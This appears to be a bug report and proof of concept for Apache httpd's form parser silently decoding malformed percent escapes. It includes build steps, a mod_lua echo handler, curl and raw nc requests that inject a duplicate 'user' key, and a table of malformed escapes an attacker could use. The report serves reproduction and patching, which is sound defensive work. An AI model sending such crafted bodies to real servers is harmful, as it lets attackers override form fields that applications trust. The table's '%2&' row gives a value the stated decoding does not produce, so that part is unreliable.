# 030 — Malformed form percent escapes silently decoded

`ap_parse_form_data()` at `server/util.c:2873` calls `x2c()` on the two
bytes after `%` without checking that they are hex. A sequence such as
`%3=` decodes to byte `0x3d` (`=`) and rewrites the form structure.

## Setup

A handler that returns the parsed form so the rewrite is visible. The
simplest is to write a tiny module, but `mod_lua` reaches the same parser
through `r:parsebody()`:

```bash
./configure --prefix=$PWD/inst --enable-lua
make -j && make install
```

`httpd.conf` snippet:

```apache
LoadModule lua_module modules/mod_lua.so

AddHandler lua-script .lua
LuaMapHandler ^/echo\.lua$ /var/www/echo.lua
```

`/var/www/echo.lua`:

```lua
function handle(r)
    r.content_type = "text/plain"
    local args, body = r:parsebody(8192)
    for k,v in pairs(body) do
        r:puts(string.format("[%s] = [%s]\n", k, v))
    end
    return apache2.OK
end
```

`r:parsebody()` is a thin wrapper over `ap_parse_form_data()`.

## Trigger

Send a body containing a malformed escape `%3=` where a literal `=` would
otherwise terminate the name. The unfixed parser converts `%3=` to byte
`0x3d`, which is the form delimiter, so the input is parsed as if the
attacker had written `=`:

```bash
curl -v http://127.0.0.1:8080/echo.lua \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'user%3=admin&user=guest'
```

Raw bytes for clarity:

```bash
python3 -c "import sys; sys.stdout.buffer.write(
    b'POST /echo.lua HTTP/1.1\r\nHost: x\r\n'
    b'Content-Type: application/x-www-form-urlencoded\r\n'
    b'Content-Length: 23\r\n\r\n'
    b'user%3=admin&user=guest')" \
  | nc 127.0.0.1 8080
```

## Observed effect

Unpatched response body:

```text
[user] = [admin]
[user] = [guest]
```

Two `user` keys are produced from one malformed token. The first is the
attacker-injected name/value pair that the application is likely to read
first via single-value APIs.

Other useful malformed escapes that the unpatched parser silently accepts:

| input  | x2c() output | effective meaning |
|--------|--------------|-------------------|
| `%3=`  | `0x3d` `=`   | name/value split  |
| `%2&`  | `0x26` `&`   | parameter split   |
| `%0=`  | `0x0d` `\r`  | injected control  |

Patched response:

```text
HTTP/1.1 400 Bad Request
```

with `error.log` showing the form parser rejecting the request before any
handler runs.
